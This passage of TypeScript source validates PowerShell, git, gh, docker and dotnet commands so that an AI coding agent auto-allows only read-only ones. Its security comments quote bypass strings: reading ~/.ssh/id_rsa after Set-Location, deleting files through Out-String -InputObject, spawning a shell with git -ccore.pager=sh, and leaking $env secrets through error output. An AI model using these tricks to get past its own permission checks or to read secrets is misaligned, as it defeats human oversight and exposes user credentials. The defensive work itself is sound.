 * Narrow fallback for isSafeOutputCommand call sites that need to keep the
 * "skip harmless pipeline tail" behavior for Format-Table / Select-Object / etc.
 * Does NOT match the full CMDLET_ALLOWLIST — only the migrated transformers.
 */
export function isAllowlistedPipelineTail(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  const canonical = resolveToCanonical(cmd.name)
  if (!PIPELINE_TAIL_CMDLETS.has(canonical)) {
    return false
  }
  return isAllowlistedCommand(cmd, originalCommand)
}

/**
 * Fail-closed gate for read-only auto-allow. Returns true ONLY for a
 * PipelineAst where every element is a CommandAst — the one statement
 * shape we can fully validate. Everything else (assignments, control
 * flow, expression sources, chain operators) defaults to false.
 *
 * Single code path to true. New AST types added to PowerShell fall
 * through to false by construction.
 */
export function isProvablySafeStatement(stmt: ParsedStatement): boolean {
  if (stmt.statementType !== 'PipelineAst') {
    return false
  }
  // Empty commands → vacuously passes the loop below. PowerShell's
  // parser guarantees PipelineAst.PipelineElements ≥ 1 for valid source,
  // but this gate is the linchpin — defend against parser/JSON edge cases.
  if (stmt.commands.length === 0) {
    return false
  }
  for (const cmd of stmt.commands) {
    if (cmd.elementType !== 'CommandAst') {
      return false
    }
  }
  return true
}

/**
 * 先解析 alias，再从 allowlist 查询命令。找到时返回配置，否则返回 undefined。
 */
function lookupAllowlist(name: string): CommandConfig | undefined {
  const lower = name.toLowerCase()
  // 先直接查询。
  const direct = CMDLET_ALLOWLIST[lower]
  if (direct) {
    return direct
  }
  // 将 alias 解析为规范名称后查询。
  const canonical = resolveToCanonical(lower)
  if (canonical !== lower) {
    return CMDLET_ALLOWLIST[canonical]
  }
  return undefined
}

/**
 * 基于 regex 同步检查 PowerShell 命令中的安全风险模式。必须同步的 isReadOnly
 * 在检查 cmdlet allowlist 前用它做快速预过滤。该方式对应 BashTool 的
 * checkReadOnlyConstraints；后者会在判定只读状态前检查 bashCommandIsSafe_DEPRECATED。
 *
 * 若命令含有表明其不应视为只读的模式，则返回 true，即便 cmdlet 位于 allowlist 中。
 */
export function hasSyncSecurityConcerns(command: string): boolean {
  const trimmed = command.trim()
  if (!trimmed) {
    return false
  }

  // 子表达式：$(...) 可以执行任意代码。
  if (/\$\(/.test(trimmed)) {
    return true
  }

  // Splatting: @variable passes arbitrary parameters. Real splatting is
  // token-start only — `@` preceded by whitespace/separator/start, not mid-word.
  // `[^\w.]` excludes word chars and `.` so `user@example.com` (email) and
  // `file.@{u}` don't match, but ` @splat` / `;@splat` / `^@splat` do.
  if (/(?:^|[^\w.])@\w+/.test(trimmed)) {
    return true
  }

  // 成员调用：.Method() 可以调用任意 .NET 方法。
  if (/\.\w+\s*\(/.test(trimmed)) {
    return true
  }

  // 赋值：$var = ... 可以修改状态。
  if (/\$\w+\s*[+\-*/]?=/.test(trimmed)) {
    return true
  }

  // stop-parsing 符号：--% 会把后续所有内容原样传给原生命令。
  if (/--%/.test(trimmed)) {
    return true
  }

  // UNC 路径：\\server\share 或 //server/share 可触发网络请求，泄漏 NTLM/Kerberos 凭据。
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() with atom search, short command strings
  if (/\\\\/.test(trimmed) || /(?<!:)\/\//.test(trimmed)) {
    return true
  }

  // 静态方法调用：[Type]::Method() 可以调用任意 .NET 方法。
  if (/::/.test(trimmed)) {
    return true
  }

  return false
}

/**
 * 根据 cmdlet allowlist 检查 PowerShell 命令是否只读。
 *
 * @param command - 原始 PowerShell 命令字符串
 * @param parsed - 命令经 AST 解析后的表示
 * @returns 命令只读时为 true，否则为 false
 */
export function isReadOnlyCommand(command: string, parsed?: ParsedPowerShellCommand): boolean {
  const trimmedCommand = command.trim()
  if (!trimmedCommand) {
    return false
  }

  // 没有可用的已解析 AST 时，保守返回 false。
  if (!parsed) {
    return false
  }

  // 解析失败时拒绝。
  if (!parsed.valid) {
    return false
  }

  const security = deriveSecurityFlags(parsed)
  // 拒绝带 scriptblock 的命令，因为无法验证其中代码。例如
  // Get-Process | ForEach-Object { Remove-Item C:\foo } 看似安全管道，
  // 但 scriptblock 内含破坏性代码。
  if (
    security.hasScriptBlocks ||
    security.hasSubExpressions ||
    security.hasExpandableStrings ||
    security.hasSplatting ||
    security.hasMemberInvocations ||
    security.hasAssignments ||
    security.hasStopParsing
  ) {
    return false
  }

  const segments = getPipelineSegments(parsed)

  if (segments.length === 0) {
    return false
  }

  // SECURITY: Block compound commands that contain a cwd-changing cmdlet
  // (Set-Location/Push-Location/Pop-Location/New-PSDrive) alongside any other
  // statement. This was previously scoped to cd+git only, but that overlooked
  // the isReadOnlyCommand auto-allow path for cd+read compounds (finding #27):
  //   Set-Location ~; Get-Content ./.ssh/id_rsa
  // Both cmdlets are in CMDLET_ALLOWLIST, so without this guard the compound
  // auto-allows. Path validation resolved ./.ssh/id_rsa against the STALE
  // validator cwd (e.g. /project), missing any Read(~/.ssh/**) deny rule.
  // At runtime PowerShell cd's to ~, reads ~/.ssh/id_rsa.
  //
  // Any compound containing a cwd-changing cmdlet cannot be auto-classified
  // read-only when other statements may use relative paths — those paths
  // resolve differently at runtime than at validation time. BashTool has the
  // equivalent guard via compoundCommandHasCd threading into path validation.
  const totalCommands = segments.reduce((sum, seg) => sum + seg.commands.length, 0)
  if (totalCommands > 1) {
    const hasCd = segments.some((seg) => seg.commands.some((cmd) => isCwdChangingCmdlet(cmd.name)))
    if (hasCd) {
      return false
    }
  }

  // 逐条检查语句；每条都必须只读。
  for (const pipeline of segments) {
    if (!pipeline || pipeline.commands.length === 0) {
      return false
    }

    // 拒绝会写文件的文件重定向。`> $null` 只丢弃输出，不属于文件系统写入，
    // 因此不会使命令失去只读资格。
    if (pipeline.redirections.length > 0) {
      const hasFileRedirection = pipeline.redirections.some(
        (r) => !r.isMerging && !isNullRedirectionTarget(r.target),
      )
      if (hasFileRedirection) {
        return false
      }
    }

    // 第一条命令必须位于 allowlist 中。
    const firstCmd = pipeline.commands[0]
    if (!firstCmd) {
      return false
    }

    if (!isAllowlistedCommand(firstCmd, command)) {
      return false
    }

    // Remaining pipeline commands must be safe output cmdlets OR allowlisted
    // (with arg validation). Format-Table/Measure-Object moved from
    // SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST after security review found all
    // accept calculated-property hashtables. isAllowlistedCommand runs their
    // argLeaksValue callback: bare `| Format-Table` passes, `| Format-Table
    // $env:SECRET` fails. SECURITY: nameType gate catches 'scripts\\Out-Null'
    // (raw name has path chars → 'application'). cmd.name is stripped to
    // 'Out-Null' which would match SAFE_OUTPUT_CMDLETS, but PowerShell runs
    // scripts\\Out-Null.ps1.
    for (let i = 1; i < pipeline.commands.length; i++) {
      const cmd = pipeline.commands[i]
      if (!cmd || cmd.nameType === 'application') {
        return false
      }
      // SECURITY: isSafeOutputCommand is name-only; only short-circuit for
      // zero-arg invocations. Out-String -InputObject:(rm x) — the paren is
      // evaluated when Out-String runs. With name-only check and args, the
      // colon-bound paren bypasses. Force isAllowlistedCommand (arg validation)
      // when args present — Out-String/Out-Null/Out-Host are NOT in
      // CMDLET_ALLOWLIST so any args will reject.
      //   PoC: Get-Process | Out-String -InputObject:(Remove-Item /tmp/x)
      //   → auto-allow → Remove-Item runs.
      if (isSafeOutputCommand(cmd.name) && cmd.args.length === 0) {
        continue
      }
      if (!isAllowlistedCommand(cmd, command)) {
        return false
      }
    }

    // SECURITY: Reject statements with nested commands. nestedCommands are
    // CommandAst nodes found inside script block arguments, ParenExpressionAst
    // children of colon-bound parameters, or other non-top-level positions.
    // A statement with nestedCommands is by definition not a simple read-only
    // invocation — it contains executable sub-pipelines that bypass the
    // per-command allowlist check above.
    if (pipeline.nestedCommands && pipeline.nestedCommands.length > 0) {
      return false
    }
  }

  return true
}

/**
 * 检查单个命令元素是否位于 allowlist 中并通过 flag 验证。
 */
export function isAllowlistedCommand(cmd: ParsedCommandElement, originalCommand: string): boolean {
  // SECURITY: nameType is computed from the raw (pre-stripModulePrefix) name.
  // 'application' means the raw name contains path chars (. \\ /) — e.g.
  // 'scripts\\Get-Process', './git', 'node.exe'. PowerShell resolves these as
  // file paths, not as the cmdlet/command the stripped name matches. Never
  // auto-allow: the allowlist was built for cmdlets, not arbitrary scripts.
  // Known collateral: 'Microsoft.PowerShell.Management\\Get-ChildItem' also
  // classifies as 'application' (contains . and \\) and will prompt. Acceptable
  // since module-qualified names are rare in practice and prompting is safe.
  if (cmd.nameType === 'application') {
    // Bypass for explicit safe .exe names (bash `which` parity — see
    // SAFE_EXTERNAL_EXES). SECURITY: match the raw first token of cmd.text,
    // not cmd.name. stripModulePrefix collapses scripts\where.exe →
    // cmd.name='where.exe', but cmd.text preserves 'scripts\where.exe ...'.
    const rawFirstToken = cmd.text.split(/\s/, 1)[0]?.toLowerCase() ?? ''
    if (!SAFE_EXTERNAL_EXES.has(rawFirstToken)) {
      return false
    }
    // Fall through to lookupAllowlist — CMDLET_ALLOWLIST['where.exe'] handles
    // flag validation (empty config = all flags OK, matching bash's `which`).
  }

  const config = lookupAllowlist(cmd.name)
  if (!config) {
    return false
  }

  // 若存在 regex 约束，则用它检查原始命令。
  if (config.regex && !config.regex.test(originalCommand)) {
    return false
  }

  // 若存在额外回调，则执行检查。
  if (config.additionalCommandIsDangerousCallback?.(originalCommand, cmd)) {
    return false
  }

  // SECURITY: whitelist arg elementTypes — only StringConstant and Parameter
  // are statically verifiable. Everything else expands/evaluates at runtime:
  //   'Variable'          → `Get-Process $env:AWS_SECRET_ACCESS_KEY` expands,
  //                         errors "Cannot find process 'sk-ant-...'", model
  //                         reads the secret from the error
  //   'Other' (Hashtable) → `Get-Process @{k=$env:SECRET}` same leak
  //   'Other' (Convert)   → `Get-Process [string]$env:SECRET` same leak
  //   'Other' (BinaryExpr)→ `Get-Process ($env:SECRET + '')` same leak
  //   'SubExpression'     → arbitrary code (already caught by deriveSecurityFlags
  //                         at the isReadOnlyCommand layer, but isAllowlistedCommand
  //                         is also called from checkPermissionMode directly)
  // hasSyncSecurityConcerns misses bare $var (only matches `$(`/@var/.Method(/
  // $var=/--%/::); deriveSecurityFlags has no 'Variable' case; the safeFlags
  // loop below validates flag NAMES but not positional arg TYPES. File cmdlets
  // (CMDLET_PATH_CONFIG) are already protected by SAFE_PATH_ELEMENT_TYPES in
  // pathValidation.ts — this closes the gap for non-file cmdlets (Get-Process,
  // Get-Service, Get-Command, ~15 others). PS equivalent of Bash's blanket `$`
  // token check at BashTool/readOnlyValidation.ts:~1356.
  //
  // Placement: BEFORE external-command dispatch so git/gh/docker/dotnet get
  // this too (defense-in-depth with their string-based `$` checks; catches
  // @{...}/[cast]/($a+$b) that `$` substring misses). In PS argument mode,
  // bare `5` tokenizes as StringConstant (BareWord), not a numeric literal,
  // so `git log -n 5` passes.
  //
  // SECURITY: elementTypes undefined → fail-closed. The real parser always
  // sets it (parser.ts:769/781/812), so undefined means an untrusted or
  // malformed element. Previously skipped (fail-open) for test-helper
  // convenience; test helpers now set elementTypes explicitly.
  // elementTypes[0] is the command name; args start at elementTypes[1].
  if (!cmd.elementTypes) {
    return false
  }
  for (let i = 1; i < cmd.elementTypes.length; i++) {
    const t = cmd.elementTypes[i]
    if (t !== 'StringConstant' && t !== 'Parameter') {
      // ArrayLiteralAst (`Get-Process Name, Id`) maps to 'Other'. The
      // leak vectors enumerated above all have a metachar in their extent
      // text: Hashtable `@{`, Convert `[`, BinaryExpr-with-var `$`,
      // ParenExpr `(`. A bare comma-list of identifiers has none.
      if (!/[$(@{[]/.test(cmd.args[i - 1] ?? '')) {
        continue
      }
      return false
    }
    // Colon-bound parameter (`-Flag:$env:SECRET`) is a SINGLE
    // CommandParameterAst — the VariableExpressionAst is its .Argument
    // child, not a separate CommandElement, so elementTypes says 'Parameter'
    // and the whitelist above passes.
    //
    // Query the parser's children[] tree instead of doing
    // string-archaeology on the arg text. children[i-1] holds the
    // .Argument child's mapped type (aligned with args[i-1]).
    // Tree query catches MORE than the string check — e.g.
    // `-InputObject:@{k=v}` (HashtableAst → 'Other', no `$` in text),
    // `-Name:('payload' > file)` (ParenExpressionAst with redirection).
    // Fallback to the extended metachar check when children is undefined
    // (backward compat / test helpers that don't set it).
    if (t === 'Parameter') {
      const paramChildren = cmd.children?.[i - 1]
      if (paramChildren) {
        if (paramChildren.some((c) => c.type !== 'StringConstant')) {
          return false
        }
      } else {
        // Fallback: string-archaeology on arg text (pre-children parsers).
        // Reject `$` (variable), `(` (ParenExpressionAst), `@` (hash/array
        // sub), `{` (scriptblock), `[` (type literal/static method).
        const arg = cmd.args[i - 1] ?? ''
        const colonIdx = arg.indexOf(':')
        if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
          return false
        }
      }
    }
  }

  const canonical = resolveToCanonical(cmd.name)

  // 通过共享验证处理外部命令。
  if (
    canonical === 'git' ||
    canonical === 'gh' ||
    canonical === 'docker' ||
    canonical === 'dotnet'
  ) {
    return isExternalCommandSafe(canonical, cmd.args)
  }

  // Windows 原生命令可用 / 作为 flag 前缀（如 findstr /S），但 PowerShell cmdlet
  // 始终使用 - 前缀参数，因此 /tmp 是路径而非 flag。通过检查命令能否直接或经 alias
  // 解析为 Verb-Noun 规范名称来识别 cmdlet。
  const isCmdlet = canonical.includes('-')

  // SECURITY: if allowAllFlags is set, skip flag validation (command's entire
  // flag surface is read-only). Otherwise, missing/empty safeFlags means
  // "positional args only, reject all flags" — NOT "accept everything".
  if (config.allowAllFlags) {
    return true
  }
  if (!config.safeFlags || config.safeFlags.length === 0) {
    // 未定义 safeFlags 且未设置 allowAllFlags 时拒绝所有 flag。
    // 仍允许纯位置参数（下方循环不会触发）；这是安全默认值，命令必须显式允许 flag。
    const hasFlags = cmd.args.some((arg, i) => {
      if (isCmdlet) {
        return isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      }
      return arg.startsWith('-') || (process.platform === 'win32' && arg.startsWith('/'))
    })
    return !hasFlags
  }

  // 验证使用的所有 flag 都位于 allowlist 中。
  // SECURITY: use elementTypes as ground
  // truth for parameter detection. PowerShell's tokenizer accepts en-dash/
  // em-dash/horizontal-bar (U+2013/2014/2015) as parameter prefixes; a raw
  // startsWith('-') check misses `–ComputerName` (en-dash). The parser maps
  // CommandParameterAst → 'Parameter' regardless of dash char.
  // elementTypes[0] is the name element; args start at elementTypes[1].
  for (let i = 0; i < cmd.args.length; i++) {
    const arg = cmd.args[i]!
    // For cmdlets: trust elementTypes (AST ground truth, catches Unicode dashes).
    // For native exes on Windows: also check `/` prefix (argv convention, not
    // tokenizer — the parser sees `/S` as a positional, not CommandParameterAst).
    const isFlag = isCmdlet
      ? isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      : arg.startsWith('-') || (process.platform === 'win32' && arg.startsWith('/'))
    if (isFlag) {
      // For cmdlets, normalize Unicode dash to ASCII hyphen for safeFlags
      // comparison (safeFlags entries are always written with ASCII `-`).
      // Native-exe safeFlags are stored with `/` (e.g. '/FO') — don't touch.
      let paramName = isCmdlet ? `-${arg.slice(1)}` : arg
      const colonIndex = paramName.indexOf(':')
      if (colonIndex > 0) {
        paramName = paramName.substring(0, colonIndex)
      }

      // -ErrorAction/-Verbose/-Debug etc. are accepted by every cmdlet via
      // [CmdletBinding()] and only route error/warning/progress streams —
      // they can't make a read-only cmdlet write. pathValidation.ts already
      // merges these into its per-cmdlet param sets (line ~1339); this is
      // the same merge for safeFlags. Without it, `Get-Content file.txt
      // -ErrorAction SilentlyContinue` prompts despite Get-Content being
      // allowlisted. Only for cmdlets — native exes don't have common params.
      const paramLower = paramName.toLowerCase()
      if (isCmdlet && COMMON_PARAMETERS.has(paramLower)) {
        continue
      }
      const isSafe = config.safeFlags.some((flag) => flag.toLowerCase() === paramLower)
      if (!isSafe) {
        return false
      }
    }
  }

  return true
}

// ---------------------------------------------------------------------------
// 使用共享配置验证外部命令（git、gh、docker）。
// ---------------------------------------------------------------------------

function isExternalCommandSafe(command: string, args: string[]): boolean {
  switch (command) {
    case 'git':
      return isGitSafe(args)
    case 'gh':
      return isGhSafe(args)
    case 'docker':
      return isDockerSafe(args)
    case 'dotnet':
      return isDotnetSafe(args)
    default:
      return false
  }
}

const DANGEROUS_GIT_GLOBAL_FLAGS = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  // SECURITY: --attr-source creates a parser differential. Git treats the
  // token after the tree-ish value as a pathspec (not the subcommand), but
  // our skip-by-2 loop would treat it as the subcommand:
  //   git --attr-source HEAD~10 log status
  //   validator: advances past HEAD~10, sees subcmd=log → allow
  //   git:       consumes `log` as pathspec, runs `status` as the real subcmd
  // Verified with `GIT_TRACE=1 git --attr-source HEAD~10 log status` →
  // `trace: built-in: git status`. Reject outright rather than skip-by-2.
  '--attr-source',
])

// 接收独立空格分隔值参数的 Git 全局 flag。循环遇到不带内联 `=` 值的此类 flag 时，
// 必须跳过下一个 token，以免把值误认为子命令。
//
// SECURITY: This set must be COMPLETE. Any value-consuming global flag not
// listed here creates a parser differential: validator sees the value as the
// subcommand, git consumes it and runs the NEXT token. Audited against
// `man git` + GIT_TRACE for git 2.51; --list-cmds is `=`-only, booleans
// (-p/--bare/--no-*/--*-pathspecs/--html-path/etc.) advance by 1 via the
// default path. --attr-source REMOVED: it also triggers pathspec parsing,
// creating a second differential — moved to DANGEROUS_GIT_GLOBAL_FLAGS above.
const GIT_GLOBAL_FLAGS_WITH_VALUES = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--super-prefix',
  '--shallow-file',
])

// 接收紧连形式值的 Git 短全局 flag，即 flag 字母和值之间没有空格。长选项
//（--git-dir 等）要求 `=` 或空格，因此按 `=` 拆分的检查可以处理；但
// `-ccore.pager=sh` 和 `-C/path` 需要前缀匹配，因为 git 会直接解析
// `-c<name>=<value>` 和 `-C<path>`。
const DANGEROUS_GIT_SHORT_FLAGS_ATTACHED = ['-c', '-C']

function isGitSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

  // SECURITY: Reject any arg containing `$` (variable reference). Bare
  // VariableExpressionAst positionals reach here as literal text ($env:SECRET,
  // $VAR). deriveSecurityFlags does not gate bare Variable args. The validator
  // sees `$VAR` as text; PowerShell expands it at runtime. Parser differential:
  //   git diff $VAR   where $VAR = '--output=/tmp/evil'
  //   → validator sees positional '$VAR' → validateFlags passes
  //   → PowerShell runs `git diff --output=/tmp/evil` → file write
  // This generalizes the ls-remote inline `$` guard below to all git subcommands.
  // Bash equivalent: BashTool blanket
  // `$` rejection at readOnlyValidation.ts:~1352. isGhSafe has the same guard.
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  // 跳过子命令之前的全局 flag，并拒绝危险项。接收空格分隔值的 flag 必须消费下一个
  // token，以免将值误认为子命令，如 `git --namespace foo status`。
  let idx = 0
  while (idx < args.length) {
    const arg = args[idx]
    if (!arg?.startsWith('-')) {
      break
    }
    // SECURITY: Attached-form short flags. `-ccore.pager=sh` splits on `=` to
    // `-ccore.pager`, which isn't in DANGEROUS_GIT_GLOBAL_FLAGS. Git accepts
    // `-c<name>=<value>` and `-C<path>` with no space. We must prefix-match.
    // Note: `--cached`, `--config-env`, etc. already fail startsWith('-c') at
    // position 1 (`-` ≠ `c`). The `!== '-'` guard only applies to `-c`
    // (git config keys never start with `-`, so `-c-key` is implausible).
    // It does NOT apply to `-C` — directory paths CAN start with `-`, so
    // `git -C-trap status` must reject. `git -ccore.pager=sh log` spawns a shell.
    for (const shortFlag of DANGEROUS_GIT_SHORT_FLAGS_ATTACHED) {
      if (
        arg.length > shortFlag.length &&
        arg.startsWith(shortFlag) &&
        (shortFlag === '-C' || arg[shortFlag.length] !== '-')
      ) {
        return false
      }
    }
    const hasInlineValue = arg.includes('=')
    const flagName = hasInlineValue ? arg.split('=')[0] || '' : arg
    if (DANGEROUS_GIT_GLOBAL_FLAGS.has(flagName)) {
      return false
    }
    // flag 接收独立值时消费下一个 token。
    if (!hasInlineValue && GIT_GLOBAL_FLAGS_WITH_VALUES.has(flagName)) {
      idx += 2
    } else {
      idx++
    }
  }

  if (idx >= args.length) {
    return true
  }

  // 先尝试多单词子命令（如 'stash list'、'config --get'、'remote show'）。
  const first = args[idx]?.toLowerCase() || ''
  const second = idx + 1 < args.length ? args[idx + 1]?.toLowerCase() || '' : ''

  // GIT_READ_ONLY_COMMANDS 的 key 形如 'git diff'、'git stash list'。
  const twoWordKey = `git ${first} ${second}`
  const oneWordKey = `git ${first}`

  let config: ExternalCommandConfig | undefined = GIT_READ_ONLY_COMMANDS[twoWordKey]
  let subcommandTokens = 2

  if (!config) {
    config = GIT_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(idx + subcommandTokens)

  // git ls-remote URL rejection — ported from BashTool's inline guard
  // (src/tools/BashTool/readOnlyValidation.ts:~962). ls-remote with a URL
  // is a data-exfiltration vector (encode secrets in hostname → DNS/HTTP).
  // Reject URL-like positionals: `://` (http/git protocols), `@` + `:` (SSH
  // git@host:path), and `$` (variable refs — $env:URL reaches here as the
  // literal string '$env:URL' when the arg's elementType is Variable; the
  // security-flag checks don't gate bare Variable positionals passed to
  // external commands).
  if (first === 'ls-remote') {
    for (const arg of flagArgs) {
      if (!arg.startsWith('-')) {
        if (arg.includes('://') || arg.includes('@') || arg.includes(':') || arg.includes('$')) {
          return false
        }
      }
    }
  }

  if (config.additionalCommandIsDangerousCallback?.('', flagArgs)) {
    return false
  }
  return validateFlags(flagArgs, 0, config, { commandName: 'git' })
}

function isGhSafe(args: string[]): boolean {
  // gh 命令依赖网络，只对 ant 用户允许。
  if (!isInternalBuild()) {
    return false
  }

  if (args.length === 0) {
    return true
  }

  // 先尝试双单词子命令（如 'pr view'）。
  let config: ExternalCommandConfig | undefined
  let subcommandTokens = 0

  if (args.length >= 2) {
    const twoWordKey = `gh ${args[0]?.toLowerCase()} ${args[1]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[twoWordKey]
    subcommandTokens = 2
  }

  // 再尝试单单词子命令（如 'gh version'）。
  if (!config && args.length >= 1) {
    const oneWordKey = `gh ${args[0]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(subcommandTokens)

  // SECURITY: Reject any arg containing `$` (variable reference). Bare
  // VariableExpressionAst positionals reach here as literal text ($env:SECRET).
  // deriveSecurityFlags does not gate bare Variable args — only subexpressions,
  // splatting, expandable strings, etc. All gh subcommands are network-facing,
  // so a variable arg is a data-exfiltration vector:
  //   gh search repos $env:SECRET_API_KEY
  //   → PowerShell expands at runtime → secret sent to GitHub API.
  // git ls-remote has an equivalent inline guard; this generalizes it for gh.
  // Bash equivalent: BashTool blanket `$` rejection at readOnlyValidation.ts:~1352.
  for (const arg of flagArgs) {
    if (arg.includes('$')) {
      return false
    }
  }
  if (config.additionalCommandIsDangerousCallback?.('', flagArgs)) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

function isDockerSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

  // SECURITY: blanket PowerShell `$` variable rejection. Same guard as
  // isGitSafe and isGhSafe. Parser differential: validator sees literal
  // '$env:X'; PowerShell expands at runtime. Runs BEFORE the fast-path
  // return — the previous location (after fast-path) never fired for
  // `docker ps`/`docker images`. The earlier comment claiming those take no
  // --format was wrong: `docker ps --format $env:AWS_SECRET_ACCESS_KEY`
  // auto-allowed, PowerShell expanded, docker errored with the secret in
  // its output, model read it. Check ALL args, not flagArgs — args[0]
  // (subcommand slot) could also be `$env:X`. elementTypes whitelist isn't
  // applicable here: this function receives string[] (post-stringify), not
  // ParsedCommandElement; the isAllowlistedCommand caller applies the
  // elementTypes gate one layer up.
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  const oneWordKey = `docker ${args[0]?.toLowerCase()}`

  // 快速路径：EXTERNAL_READONLY_COMMANDS 条目（'docker ps'、'docker images'）
  // 没有 flag 约束；通过上方 `$` 关卡后无条件允许。
  if (EXTERNAL_READONLY_COMMANDS.includes(oneWordKey)) {
    return true
  }

  // DOCKER_READ_ONLY_COMMANDS 条目（'docker logs'、'docker inspect'）带逐 flag 配置。
  // 与 isGhSafe 一致：先查询配置，再调用 validateFlags。
  const config: ExternalCommandConfig | undefined = DOCKER_READ_ONLY_COMMANDS[oneWordKey]
  if (!config) {
    return false
  }

  const flagArgs = args.slice(1)

  if (config.additionalCommandIsDangerousCallback?.('', flagArgs)) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

function isDotnetSafe(args: string[]): boolean {
  if (args.length === 0) {
    return false
  }

  // dotnet 使用 --version、--info、--list-runtimes 等顶层 flag；
  // 所有参数都必须位于安全集合中。
  for (const arg of args) {
    if (!DOTNET_READ_ONLY_FLAGS.has(arg.toLowerCase())) {
      return false
    }
  }

  return true
}
